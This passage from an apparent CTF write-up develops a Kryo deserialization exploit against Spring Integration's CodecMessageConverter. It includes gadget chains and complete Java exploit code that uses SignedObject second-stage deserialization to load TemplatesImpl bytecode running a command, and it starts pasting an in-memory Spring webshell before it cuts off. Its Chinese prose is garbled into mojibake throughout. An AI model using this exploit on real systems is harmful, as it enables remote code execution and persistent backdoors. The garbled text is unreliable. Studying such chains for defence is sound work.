src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816155525741.png" alt="image-20240816155525741"></p><p>æ‰¾åˆ°ä½ äº†ï¼Œ<code>Kryo.readObject()</code>ã€‚</p><p>å›åˆ°å‰é¢çš„<code>CodecMessageConverter</code>ï¼Œè¿™é‡ŒæŒ‡å®šäº†è§£ç çš„ç±»å‹<code>this.messageClass</code>ï¼ˆ<code>GenericMessage</code>ï¼‰ï¼Œ</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816152122326.png" alt="image-20240816152122326"></p><p>æœ€å<code>MessageCodec#decode</code>ä¹Ÿè¿”å›äº†ä¸€ä¸ª<code>Message</code>å¯¹è±¡ï¼Œæ‰€ä»¥åé¢æ„é€ çš„æ—¶å€™è¦ç”¨<code>GenericMessage</code>å°†payloadå°è£…èµ·æ¥ï¼Œå¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">GenericMessage</span> <span class="hljs-variable">genericMessage</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericMessage</span>(hashMap);<br><span class="hljs-type">byte</span>[] decodemsg = (<span class="hljs-type">byte</span>[]) codecMessageConverter.fromMessage(genericMessage, <span class="hljs-literal">null</span>);<br>System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(decodemsg), <span class="hljs-string">&quot;UTF-8&quot;</span>));<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›<code>GenericMessage</code>ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816152901266.png" alt="image-20240816152901266"></p><p>çœ‹åˆ°äº†å‰é¢æœ€åè¿”å›çš„getPayload()ï¼Œä¹Ÿå¯ä»¥è¯´æ˜æˆ‘ä»¬ååºåˆ—åŒ–å¾—åˆ°çš„ç»“æœæ˜¯ä¸ªGenericMessageå¯¹è±¡ã€‚</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816152513832.png" alt="image-20240816152513832"></p><p>å‡ ä¸ªè€ç†Ÿäººäº†ï¼ŒåŸºæœ¬ä¸Šçœ‹åˆ°è¿™äº›å°±èƒ½æƒ³åˆ°å¯¹åº”é“¾å­ã€‚</p><p>åœ¨<a href="https://so.csdn.net/so/search?q=Spring%E4%BE%9D%E8%B5%96&spm=1001.2101.3001.7020">Springä¾èµ–</a>ä¸‹ï¼Œå¯ä»¥è§¦å‘<code>jackson</code>çš„<code>BaseJsonNode#toString</code>ï¼Œä»è€Œè°ƒç”¨getterï¼Œè€Œåä¸ºæ‰€æ¬²ä¸ºï¼Œè‡³äºå¦‚ä½•è°ƒç”¨<code>toString</code>ï¼Œå¯¹äºåŸç”Ÿååºåˆ—åŒ–ï¼Œèµ°<code>BadAttributeValueExpException</code>æœ€ä¸ºæ–¹ä¾¿ï¼Œå¯¹äºFieldå‹çš„éåŸç”Ÿååºåˆ—åŒ–ï¼Œå¦‚æœå¯¹äºMapçš„ååºåˆ—åŒ–è¿‡ç¨‹æœ‰ç±»ä¼¼<code>HashMap#put</code>çš„å®ç°ï¼Œå°±å¯ä»¥è€ƒè™‘<code>HotSwappableTargetSource</code>åˆ©ç”¨é“¾ï¼Œè¿™ä¹Ÿæ˜¯KryoéåŸç”Ÿååºåˆ—åŒ–é“¾å­çš„é‡è¦éƒ¨åˆ†ã€‚</p><p>ä½†æ˜¯ç›´æ¥ç”¨Kryoé“¾å­å¥—è‚¯å®šä¸è¡Œï¼Œå› ä¸ºç½‘ä¸ŠKryoç›¸å…³çš„æ”»å‡»éƒ½æ˜¯åœ¨Dubboä¸‹åˆ©ç”¨çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">com.esotericsoftware.kryo#readClassAndObject -&gt;<br>    com.esotericsoftware.kryo.serializers#read -&gt;<br>        java.util.HashMap#put -&gt;<br>            org.springframework.aop.target.HotSwappableTargetSource#equals -&gt;<br>                com.sun.org.apache.xpath.internal.objects.XString -&gt;<br>                    com.alibaba.fastjson.JSON#toString -&gt; fastjson gadget <br>                            -&gt; TemplatesImpl to load evil class<br></code></pre></td></tr></table></figure><p>ç”¨çš„æ˜¯ä»<code>HotSwappableTargetSource</code>å¥—ä¸€å±‚ç„¶åè§¦å‘åˆ°<code>fastjson#toString</code>çš„gadgetã€‚</p><p>ä½†fastjsonæ˜¯Dubboè‡ªå¸¦çš„ï¼Œæœ¬é¢˜æ²¡æœ‰è¿™ä¸ªä¾èµ–ï¼Œä¹Ÿå°±æ˜¯è¦æ‰¾ååŠæ®µé“¾å­æ¥æ¥ä¸Š<code>toString</code>ã€‚</p><p>æ ¹æ®é¢˜ç›®æç¤ºç”¨HessianåŸç”ŸJDKå»æ‰“ï¼ˆHessianåœ¨é‚£æ¡é“¾åªå……å½“<code>source</code>è§¦å‘toStringï¼‰ï¼Œè¿™é‡Œç”¨åˆ°çš„å°±æ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.activation.MimeTypeParameterList<br></code></pre></td></tr></table></figure><p>æ•´ä½“é“¾å­æ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.activation.MimeTypeParameterList#toString<br>UIDefaults#get<br>UIDefaults#getFromHashTable<br>UIDefaults$LazyValue#createValue<br>SwingLazyValue#createValue<br>sun.reflect.misc.MethodUtil#invoke<br></code></pre></td></tr></table></figure><p>å…·ä½“çš„Hessianåˆ†æå°±å…äº†ï¼Œå¯ä»¥çœ‹ï¼š<a href="https://p4d0rn.gitbook.io/java/serial-journey/hessian_only_jdk#mimetypeparameterlist--methodutil">Hessian_Only_JDK | Java (gitbook.io)</a></p><p>æˆ‘ä»¬å¯¹<code>decode</code>æ–¹æ³•è¿›è¡Œè°ƒè¯•ï¼Œå‘ç°å®ƒä¼šè¿›åˆ°<code>kryo.readObject()</code>ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œå¯ä»¥è§¦å‘<code>kryo</code>ååºåˆ—åŒ–çš„æ‰“æ³•ï¼Œ<code>kryo</code>å’Œ<code>Hessian</code>æ˜¯ä¸€ç±»çš„ï¼Œéƒ½æ˜¯åŸºäº<code>Field</code>æœºåˆ¶ï¼Œä¼šè¿›å…¥åˆ°<code>hashMap.put</code>ä¸­ï¼Œå› æ­¤å¯ä»¥ç”¨<code>Hessian</code>çš„é“¾å­æ¥æ‰“ã€‚</p><p>é¦–å…ˆæœ¬åœ°å°è¯•ä¸‹kryoçš„<code>templatesImpl</code>é“¾å­å§ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">kyro#readObject() -&gt;<br>    hashMap#put() -&gt;<br>    HotSwappableTargetSource#equals() -&gt;<br>    Xstring#equals() -&gt;<br>    BaseJsonNode#toString() -&gt;<br>    templatesImpl#getOutputProperties()<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-literal">null</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getTemplates()&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojoNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">hotSwappableTargetSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">hotSwappableTargetSource1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(hotSwappableTargetSource, <span class="hljs-string">&quot;1&quot;</span>);<br>        hashMap.put(hotSwappableTargetSource1, <span class="hljs-string">&quot;2&quot;</span>);<br><br>        setFieldValue(hotSwappableTargetSource, <span class="hljs-string">&quot;target&quot;</span>, pojoNode);<br>        setFieldValue(hotSwappableTargetSource1, <span class="hljs-string">&quot;target&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;a&quot;</span>));<br><br>        <span class="hljs-type">CodecMessageConverter</span> <span class="hljs-variable">codecMessageConverter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CodecMessageConverter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageCodec</span>());<br>        <span class="hljs-type">GenericMessage</span> <span class="hljs-variable">genericMessage</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericMessage</span>(hashMap);<br>        <span class="hljs-type">byte</span>[] decodemsg = (<span class="hljs-type">byte</span>[]) codecMessageConverter.fromMessage(genericMessage, <span class="hljs-literal">null</span>);<br>        System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(decodemsg), <span class="hljs-string">&quot;UTF-8&quot;</span>));<br><br>        Message&lt;?&gt; messagecode = codecMessageConverter.toMessage(decodemsg, (MessageHeaders) <span class="hljs-literal">null</span>);<br>        messagecode.getPayload();<br>    &#125;<br></code></pre></td></tr></table></figure><p>ä¸å‡ºæ„å¤–çš„æŠ¥é”™äº†ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816161919403.png" alt="image-20240816161919403"></p><p>æŠ¥äº†<code>Null</code>æŒ‡é’ˆå¼‚å¸¸ï¼Œä¸‹ä¸ªæ–­ç‚¹çœ‹çœ‹ï¼Œè™½ç„¶å¼¹å‡ºcalcäº†ï¼Œä½†æ˜¯å®è´¨ä¸Šæ²¡æœ‰åˆ©ç”¨æˆåŠŸã€‚</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816162348967.png" alt="image-20240816162348967"></p><p>å› ä¸ºè°ƒè¯•è¿›å…¥åï¼Œä½ ä¼šå‘ç°å³ä½¿ç»™<code>_factory</code>èµ‹å€¼äº†ï¼Œæœ€ç»ˆè¿˜æ˜¯ä¼šå˜æˆ<code>null</code>ä»è€Œè§¦å‘å¼‚å¸¸ï¼Œå› ä¸º<code>_tfactory</code>æ˜¯<code>transient</code>ä¿®é¥°çš„ï¼Œä¸èƒ½å‚ä¸åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚è€Œä¸”å‰é¢ä¹Ÿè¯´è¿‡Kryoå’ŒHessianç±»ä¼¼ï¼Œä¹Ÿæœ‰è¿™ä¸ªç‰¹ç‚¹ã€‚</p><p>é‚£ä¹ˆå¯ä»¥ç”¨äºŒæ¬¡ååºåˆ—åŒ–ï¼Œè¿™æ ·å°±æ— å…³<code>_tfactory</code>äº†ã€‚<a href="https://eddiemurphy89.github.io/2024/08/04/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">äºŒæ¬¡ååºåˆ—åŒ– - EddieMurphyâ€™s blog (eddiemurphy89.github.io)</a></p><p>Gadgetå‘¼ä¹‹æ¬²å‡ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">kyro#readObject() -&gt;<br>hashMap#put() -&gt;<br>HotSwappableTargetSource#equals() -&gt;<br>Xstring#equals() -&gt;<br>BaseJsonNode#toString() -&gt;<br>SignedObject#getObject() -&gt;<br>HashMap#readObject() -&gt;<br>templatesImpl#getOutputProperties()<br></code></pre></td></tr></table></figure><p>æ³¨æ„é‡å†™<code>com.fasterxml.jackson.databind.node.BaseJsonNode</code>ï¼Œç§»é™¤å…¶<code>writeReplace()</code>æ–¹æ³•ï¼Œè®©Expé‡Œçš„ä¼˜å…ˆè°ƒç”¨æˆ‘ä»¬é‡å†™çš„æ–¹æ³•ï¼Œä»¥é¡ºåˆ©è¿›è¡Œå¯¹è±¡åºåˆ—åŒ–ï¼Œæ³¨æ„ä¸€ä¸‹æ–‡ä»¶ç»“æ„ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816170942916.png" alt="image-20240816170942916"></p><p>æµ‹è¯•ä¸€ä¸‹ï¼Œæœ¬åœ°é€šäº†ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816171350935.png" alt="image-20240816171350935"></p><p>è¡¥å……ä¸‹ï¼Œè¿™é‡Œç”¨Hessiané‚£äº›ä»€ä¹ˆSpring AOPä¹Ÿæ˜¯ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼Œæ‰“ä¸åŠ¨ã€‚</p><h3 id="å¼€ç¼"><a href="#å¼€ç¼" class="headerlink" title="å¼€ç¼"></a>å¼€ç¼</h3><p>æ•´ä½“è°ƒç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java">CodecMessageConverter<br>    -&gt; toMessage(decodemsg, ...)<br>       <span class="hljs-built_in">this</span>.codec.decode(decodemsg, ...)<br><br>AbstractKryoCodec<br>    -&gt; decode(decodemsg, ...)<br><br>PojoCodec<br>    -&gt; doDecode(...)<br><br>Kryo<br>    -&gt; readObject(...)<br><br>MapSerializer<br>    -&gt; read(...)<br>       Map#put(hotSwappableTargetSource, ...)<br><br>HotSwappableTargetSource<br>    -&gt; equals(...)<br><br>XString<br>    -&gt; equals(pojoNode)<br><br>BaseJsonNode<br>    -&gt; toString()<br>       InternalNodeMapper#nodeToString(<span class="hljs-built_in">this</span>)<br><br>SignedObject<br>    -&gt; getObject()<br>       a.readObject()<br><br>BadAttributeValueExpException<br>    -&gt; readObject()<br>       valObj.toString()<br><br>BaseJsonNode<br>    -&gt; toString()<br>       InternalNodeMapper#nodeToString(<span class="hljs-built_in">this</span>)<br><br>TemplatesImpl<br>    -&gt; getOutputProperties()<br><br>...<br></code></pre></td></tr></table></figure><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>å…¶å®ä¸Šé¢Testå°±æ˜¯EXPï¼Œè¿™é‡Œè¿˜æ˜¯è±¡å¾æ€§ç»™ä¸€ä¸‹å§ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<br><span class="hljs-keyword">import</span> org.springframework.integration.codec.CodecMessageConverter;<br><span class="hljs-keyword">import</span> org.springframework.integration.codec.kryo.MessageCodec;<br><span class="hljs-keyword">import</span> org.springframework.messaging.Message;<br><span class="hljs-keyword">import</span> org.springframework.messaging.MessageHeaders;<br><span class="hljs-keyword">import</span> org.springframework.messaging.support.GenericMessage;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-literal">null</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getTemplates()&#125;);<br><br>        POJONode pojoNode=<span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        HotSwappableTargetSource hotSwappableTargetSource=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">1</span>);<br>        HotSwappableTargetSource hotSwappableTargetSource1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">2</span>);<br>        HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        hashMap.put(hotSwappableTargetSource,<span class="hljs-string">&quot;1&quot;</span>);<br>        hashMap.put(hotSwappableTargetSource1,<span class="hljs-string">&quot;2&quot;</span>);<br>        setFieldValue(hotSwappableTargetSource,<span class="hljs-string">&quot;target&quot;</span>,pojoNode);<br>        setFieldValue(hotSwappableTargetSource1,<span class="hljs-string">&quot;target&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;a&quot;</span>));<br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(hashMap, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br><br>        POJONode pojoNode1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>        HotSwappableTargetSource hotSwappableTargetSource2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">3</span>);<br>        HotSwappableTargetSource hotSwappableTargetSource3=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">4</span>);<br><br>        HashMap hashMap1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap1.put(hotSwappableTargetSource2,<span class="hljs-string">&quot;1&quot;</span>);<br>        hashMap1.put(hotSwappableTargetSource3,<span class="hljs-string">&quot;2&quot;</span>);<br><br>        setFieldValue(hotSwappableTargetSource2,<span class="hljs-string">&quot;target&quot;</span>,pojoNode1);<br>        setFieldValue(hotSwappableTargetSource3,<span class="hljs-string">&quot;target&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;b&quot;</span>));<br><br>        <span class="hljs-type">CodecMessageConverter</span> <span class="hljs-variable">codecMessageConverter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CodecMessageConverter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageCodec</span>());<br>        <span class="hljs-type">GenericMessage</span> <span class="hljs-variable">genericMessage</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericMessage</span>(hashMap1);<br>        <span class="hljs-type">byte</span>[] decodemsg = (<span class="hljs-type">byte</span>[]) codecMessageConverter.fromMessage(genericMessage, <span class="hljs-literal">null</span>);<br>        System.out.println(Base64.getEncoder().encodeToString(decodemsg));<br><br>        <span class="hljs-comment">//ååºåˆ—åŒ–</span><br>        <span class="hljs-comment">//Message&lt;?&gt; messagecode = codecMessageConverter.toMessage(decodemsg, (MessageHeaders) null);</span><br>        <span class="hljs-comment">//messagecode.getPayload();</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplates() <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException &#123;<br>        ClassPool classPool=ClassPool.getDefault();<br>        CtClass ctClass=classPool.makeClass(<span class="hljs-string">&quot;Test&quot;</span>);<br>        ctClass.setSuperclass(classPool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">block</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(block);<br>        <span class="hljs-keyword">return</span> ctClass.toBytecode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†é—æ†¾çš„æ˜¯é¢˜ç›®ä¸å‡ºç½‘ï¼Œæœ¬åœ°è™½ç„¶å‡ºç½‘ä¹Ÿæ‰“ä¸äº†åå¼¹shellã€‚</p><p>é‚£ä¹ˆè¿™é‡Œå°±è¦å†™ä¸ªå†…å­˜é©¬è¿›å»äº†ã€‚</p><p>ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥ç”¨å­˜çš„ä¸€ä¸ªSpringé©¬ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span 